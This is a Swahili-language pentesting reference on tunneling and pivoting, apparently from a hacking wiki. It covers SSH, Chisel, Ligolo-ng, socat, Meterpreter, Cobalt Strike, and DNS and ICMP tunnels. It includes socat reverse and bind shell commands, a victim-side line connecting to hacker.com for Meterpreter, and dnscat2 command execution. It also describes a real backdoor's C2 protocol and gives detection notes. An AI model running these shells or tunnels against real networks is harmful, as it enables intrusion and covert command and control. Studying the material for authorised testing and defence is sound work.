# Tunneling and Port Forwarding

## Kidokezo cha Nmap

> [!WARNING]
> Usaidizi wa proxy wa Nmap una kikomo kwenye miunganisho ya TCP na hauathiri uchanganuzi wa ping, port, au utambuzi wa OS. Scanner inapokuwa nyuma ya SOCKS proxy, **zima utambuzi wa host** (`-Pn`) na utumie **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Command ya mwisho hutumia chaguo za `-u` na `-i` za Evil-WinRM kutambua akaunti na host ya WinRM; port chaguo-msingi ya WinRM ni 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH inaweza kusambaza miunganisho ya X11, port za TCP za kiholela, na soketi za Unix-domain kupitia channel yake iliyosimbwa kwa njia fiche.<sup>[[6]](#references)</sup>

Muunganisho wa picha wa SSH (X)

`-Y` huwezesha usambazaji wa X11 unaoaminika, na `-C` huomba compression kwa data inayosambazwa.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Fungua Port mpya katika SSH Server --> Port nyingine

Forwarding ya mbali (`-R`) husikiliza kwenye SSH server na kuunganisha upande wa local; bind address iliyobainishwa hudhibiti ni interfaces zipi zinaweza kufikia listener huyo.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

Local (`-L`) forwarding husikiliza kwenye client na huunganisha kwenye destination kutoka upande wa SSH server.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Port ya ndani --> Host iliyoathiriwa (SSH) --> Popote

Dynamic forwarding (`-D`) huunda msikilizaji wa ndani wa SOCKS4/SOCKS5 ambaye miunganisho yake hufunguliwa kutoka upande wa remote.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Hii ni muhimu ili kupata reverse shells kutoka kwa hosts za ndani kupitia DMZ hadi kwenye host yako:

Mpangilio wa `GatewayPorts` wa server hudhibiti ikiwa remote forward inaweza ku-bind nje ya loopback; thamani yake ya msingi ni `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Mfano huu unaotegemea root huunda vifaa vya tunnel kwenye hosts zote mbili. Server lazima iruhusu tun forwarding, na account iliyochaguliwa lazima iwe na access ya kifaa cha tun; `PermitRootLogin yes` ni njia mojawapo ya kutumia account ya `root` hapa.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Washa forwarding upande wa Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Weka route mpya upande wa client.
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Usalama – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 iliongeza extension ya strict-KEX ili kukabiliana na early-transport integrity attack ya Terrapin. Sasisha peers zote mbili inapowezekana na fuata mwongozo wa vendor kwa implementations za zamani badala ya kudhani kuwa forwarded channel imelindwa kwa kutegemea version pekee.<sup>[[8]](#references)</sup>

## SSHUTTLE

Unaweza kufanya **tunnel** kupitia **ssh** kwa **traffic** yote kuelekea **subnetwork** kupitia host.\
Kwa mfano, ku-forward **traffic** yote inayoelekea 10.10.10.0/24

`sshuttle` hutoa transparent proxying kupitia SSH na inasaidia kuchagua subnets pamoja na custom SSH command kama inavyoonyeshwa hapa chini.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Unganisha kwa kutumia ufunguo wa faragha
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

`portfwd` ya Metasploit inasaidia forwarding ya ndani na ya mbali, huku SOCKS proxy module yake ikiwa imekusudiwa kufanya kazi na session routes au `autoroute`, na katika mifano hii husikiliza kwenye port 1080 kwa chaguo-msingi.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Port ya ndani --> Host iliyoathiriwa (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Njia nyingine:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Beacon ya Cobalt Strike inaweza kupeleka miunganisho ya SOCKS4a/SOCKS5 kupitia Beacon; `rportfwd` hufunga port kwenye host iliyoathiriwa, huku `rportfwd_local` ikianzisha muunganisho wa destination kutoka kwa Cobalt Strike client.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Fungua port kwenye Team Server kwenye interfaces zinazopaswa kuelekeza traffic kupitia Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Katika hali hii, **port inafunguliwa kwenye Beacon host**, si kwenye Team Server, na traffic inatumwa kwenye Team Server na kutoka hapo kwenda kwenye host:port iliyoonyeshwa.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Mwongozo wa reverse-forwarding unaeleza tabia ifuatayo:<sup>[[14]](#references)</sup>

- Reverse port forward ya Beacon imeundwa **ku-tunnel traffic hadi kwenye Team Server, si kwa ajili ya ku-relay traffic kati ya machines binafsi**.
- Traffic **hu-tunnel ndani ya C2 traffic ya Beacon**, ikijumuisha links za P2P.
- High ports kwa kawaida huepuka vikwazo vya privileged ports, lakini sera ya target OS na listeners zilizopo bado hutumika.

### rPort2Port local

> [!WARNING]
> Katika hali hii, **port hufunguliwa kwenye Beacon host**, si kwenye Team Server, na **traffic hutumwa kwa Cobalt Strike client** (si kwa Team Server), kisha kutoka hapo hutumwa kwa host:port iliyoonyeshwa.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Mradi hutoa endpoints za web tunnel kama vile `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, na `tunnel.php`; pakia endpoint moja inayotumika kabla ya kuanzisha local proxy.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Unaweza kuipakua kutoka kwenye ukurasa wa releases wa [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel hubeba traffic ya TCP/UDP kupitia HTTP kwa kutumia connection iliyolindwa na SSH; tumia builds za client/server zinazooana na uhakikishe syntax ya command ya release iliyochaguliwa.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Quickstart ya Ligolo-ng inaeleza interface ya TUN kwenye proxy, uthibitishaji wa certificate-fingerprint kwa agent, na usanidi wa route kwa network iliyopitishwa kwenye tunnel.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Kufunga na Kusikiliza kwa Agent

Ligolo-ng inaweza kuongeza listeners kwenye agent wanaosambaza trafiki kwenye anwani ya upande wa proxy, na range yake iliyotengwa ya `240.0.0.0/4` inaweza kuwekewa route ili kufikia services za ndani za agent.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Fikia Porti za Ndani za Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot huanzisha reverse tunnel kutoka kwa victim na kufichua SOCKS4 proxy kwenye anwani ya loopback ya mshambuliaji; README yake pia inaeleza credentials za NTLM-proxy na chaguo za hash.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot kupitia **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat huunganisha aina za anwani kama vile `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, na `PROXY`; mifano iliyo hapa chini inachanganya endpoints hizo zilizoandikwa.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port kupitia socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter kupitia SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Unaweza kupita kwenye **non-authenticated proxy** kwa kutumia aina ya anwani `PROXY` iliyoandikwa kwenye nyaraka za socat kwa kutekeleza mstari huu badala ya wa mwisho kwenye console ya victim.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Tengeneza vyeti pande zote mbili: Client na Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Unganisha port ya SSH ya local na port 443 ya host ya mshambuliaji
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink ni zana ya muunganisho ya mstari wa amri ya PuTTY, yenye chaguo za SSH forwarding zinazofanana na `ssh`.<sup>[[22]](#references)</sup>

Tumia `-P` yenye herufi kubwa kwa porti ya SSH. `-pw` imehifadhiwa kwa ajili ya uoanifu, lakini huweka password kwenye orodha ya michakato; pendelea key authentication au `-pwfile` inapowezekana.<sup>[[22]](#references)[[23]](#references)</sup>

Kwa kuwa binary hii itatekelezwa kwenye mashine ya mwathiriwa na ni SSH client, fungua huduma na porti ya SSH kwa ajili ya reverse connection; ifuatayo inatumia `-R` ku-forward porti inayoweza kufikiwa ndani kwenda kwenye mashine ya mshambuliaji.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Tumia muktadha wenye ruhusa zinazohitajika na host wakati wa kuunda au kubadilisha sheria za kudumu za `portproxy`. Microsoft inaandika kuhusu miundo ya `v4tov4` ya add, show, na delete inayotumika hapa chini.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Unahitaji kuwa na **ufikiaji wa RDP kwenye mfumo**.\
Pakua:

SocksOverRDP hutumia Remote Desktop Dynamic Virtual Channels kubeba muunganisho wa SOCKS5 kupitia session iliyopo ya RDP; client plugin husikiliza kwenye `127.0.0.1:1080`, huku server component ikiendeshwa kwenye lengwa la RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Tool hii hutumia `Dynamic Virtual Channels` (`DVC`) kutoka kwenye kipengele cha Remote Desktop Service cha Windows. DVC inahusika na **kutunnelisha packets kupitia muunganisho wa RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Kwenye kompyuta yako ya client, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sasa tunaweza **kuunganisha** kwenye **mwathiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **prompt** ikisema kwamba **SocksOverRDP plugin imewezeshwa**, na itafanya **listen** kwenye **127.0.0.1:1080**.

**Unganisha** kupitia **RDP** na upakie na utekeleze kwenye mashine ya mwathiriwa binary ya `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sasa, thibitisha kwenye mashine yako (attacker) kwamba port 1080 inasikiliza:
```
netstat -antb | findstr 1080
```
Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) ku-proxy traffic kupitia port hiyo.<sup>[[26]](#references)</sup>

## Proxify programu za GUI za Windows

Unaweza kufanya programu za GUI za Windows zipitie proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Katika **Profile -> Proxy Servers**, ongeza IP na port ya SOCKS server.\
Katika **Profile -> Proxification Rules**, ongeza jina la programu ya ku-proxify na connections kwenye IP unazotaka ku-proxify; sheria za Proxifier zinaweza kulinganisha applications, target hosts, na ports.<sup>[[27]](#references)</sup>

## Tunnel kupitia NTLM proxy

Tool iliyotajwa awali, **Rpivot**, inaweza ku-relay kupitia proxy inayothibitisha kwa NTLM. **OpenVPN** pia inaweza ku-route kupitia proxy hiyo inapowekwa na auth file na method ya NTLMv2; hii ni proxy traversal, si bypass ya proxy authentication.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm huthibitisha utambulisho kwenye upstream NTLM proxies, hufichua local listeners, na inaweza kuunganisha local tunnel port na destination service; clients wanaweza kutumia port hiyo ya ndani.<sup>[[29]](#references)</sup>\
Kwa mfano, hiyo hupeleka port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sasa, ukiweka kwa mfano huduma ya **SSH** kwenye **victim** isikilize port 443, unaweza kuunganishwa nayo kupitia port 2222 ya **attacker**.<sup>[[29]](#references)</sup>\
Unaweza pia kutumia **meterpreter** inayounganishwa na localhost:443 huku **attacker** akisubiri kwenye port 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) ni toolkit ya Microsoft ya .NET ya reverse-proxy. Unaweza kuipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine huunda tunnel ya IPv4 kupitia DNS queries na hutumia interfaces za TUN; usanidi ulioandikwa unahitaji privileges za kuunda interfaces hizo kwenye ncha zote mbili.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Usafirishaji wa DNS una overhead kubwa kuliko TCP ya moja kwa moja na kwa kawaida huwa wa polepole; unaweza kuunda muunganisho wa SSH uliobanwa kupitia tunnel hii kwa kutumia:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Pakua kutoka hapa**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 huanzisha channel ya amri na udhibiti iliyosimbwa kwa njia fiche kupitia DNS; amri za server na client zilizo hapa chini zinafuata matumizi yake yaliyoandikwa.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Katika PowerShell**

Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha client ya dnscat2 katika PowerShell; README yake inaeleza parameters za `Start-Dnscat2` zilizoonyeshwa hapa chini.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding kwa kutumia dnscat**

Amri ya mwingiliano ya `listen` ya Dnscat2 huunganisha listener wa ndani na host na port ya mbali.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Badilisha DNS ya proxychains

Proxychains-ng huunganisha dynamically linked TCP connections na haiwezi kubeba UDP au ICMP; DNS proxying inaweza kusanidiwa, kwa hiyo kagua `proxychains.conf` iliyosakinishwa na resolver helper badala ya kudhani kuwa kuna public resolver maalum. Legacy `proxyresolv` scripts hufichua `PROXY_DNS_SERVER` kwa kuchagua resolver; tumia resolver inayoweza kufikiwa kutoka kwenye pivot wakati majina ya ndani yanahitajika.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels katika Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor aliunda **dual-channel C2 ("AK47C2")** inayotumia vibaya *outbound* **DNS** na traffic ya **plain HTTP POST** pekee – protocols mbili ambazo mara nyingi hazizuiwi kwenye mitandao ya kampuni.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Hutengeneza SessionID ya nasibu yenye herufi 5 (kwa mfano `H4T14`).
• Huongeza `1` kwa *task requests* au `2` kwa *results*, kisha huunganisha fields tofauti (flags, SessionID, jina la computer).
• Kila field **husimbwa kwa XOR kwa kutumia ASCII key `VHBD@H`**, huwekwa katika mfumo wa hexadecimal, na kuunganishwa kwa dots – hatimaye kumalizia na domain inayodhibitiwa na attacker:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests hutumia `DnsQuery()` kwa records za **TXT** (na **MG** kama fallback).
• Response inapozidi bytes 0xFF, backdoor hugawanya data katika vipande vya bytes 63 na kuingiza markers:
`s<SessionID>t<TOTAL>p<POS>` ili C2 server iweze kuvipanga upya.

2. **HTTP mode (AK47HTTP)**
• Hutengeneza JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Blob yote hubadilishwa kwa XOR-`VHBD@H` → hex → na kutumwa kama body ya **`POST /`** yenye header `Content-Type: text/plain`.
• Jibu hufuata encoding hiyo hiyo, na field ya `cmd` hutekelezwa kwa `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Tafuta **TXT queries** zisizo za kawaida ambazo label yao ya kwanza ni hexadecimal ndefu na kila mara huishia kwenye domain moja adimu.
• XOR key isiyobadilika ikifuatiwa na ASCII-hex ni rahisi kugunduliwa kwa YARA: `6?56484244?484` (`VHBD@H` katika hex).
• Kwa HTTP, weka alama kwa POST bodies za text/plain ambazo ni hex tupu na zina idadi ya bytes inayogawanyika kwa mbili.

{{#note}}
Channel huweka kila sub-domain label ndani ya kikomo cha DNS cha octets 63, lakini kufuata protocol pekee hakufanyi iwe stealthy; domains adimu, labels ndefu za hexadecimal, na query volume bado ni detection signals.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans inaeleza IPv4-over-ICMP tunnel inayotumia TUN device na ICMP echo requests; usanidi unahitaji privileges zinazotosha kuunda interface.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pakua hapa**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng husafirisha miunganisho ya TCP kupitia ICMP na hutumia chaguo za `-p`, `-l`, `-r`, na `-R` zilizoonyeshwa hapa chini kwa proxy, msikilizaji wa ndani, host lengwa, na port lengwa.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) ni agent wa kuweka huduma za mtandao za ndani mtandaoni kupitia tunnel salama; CLI yake inaandika kuhusu endpoints za HTTP, TCP, na file URL, na hostname ya endpoint inayoonyeshwa inaweza kutofautiana kulingana na endpoint na account.<sup>[[39]](#references)</sup>

### Ufungaji

- Fungua account: https://ngrok.com/signup
- Pakua client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Matumizi ya msingi

**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent pia inasaidia chaguo za authentication na TLS inapohitajika.<sup>[[39]](#references)</sup>_

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Kufichua faili kwa HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Useful for XSS,SSRF,SSTI ..._\
The standalone agent inaweka HTTP inspection interface yake kwenye `http://127.0.0.1:4040` kwa chaguo-msingi; interface hiyo ni ya HTTP traffic.<sup>[[40]](#references)</sup>

#### Tunneling internal HTTP service

Chaguo la `--host-header=rewrite` hubadilisha upstream HTTP `Host` header ili ilingane na local service.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### mfano rahisi wa usanidi wa ngrok.yaml

Hii hutumia ngrok Agent Config v2; tunnels zilizopewa majina hutumia `proto` na `addr`, na huanzishwa kwa `ngrok start`.<sup>[[42]](#references)</sup> Inafungua tunnels 3:

- 2 TCP
- 1 HTTP yenye uwasilishaji wa static files kutoka /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Kiunganishi cha Cloudflare Tunnel cha `cloudflared` huanzisha miunganisho ya kutoka nje; applications zilizochapishwa zinaweza kuelekeza HTTP, HTTPS, TCP, SSH, na RDP, huku quick tunnels zikikusudiwa kwa ajili ya uundaji wa HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### One-liner ya Quick tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### Asili ya SOCKS5 (hali ya zamani)

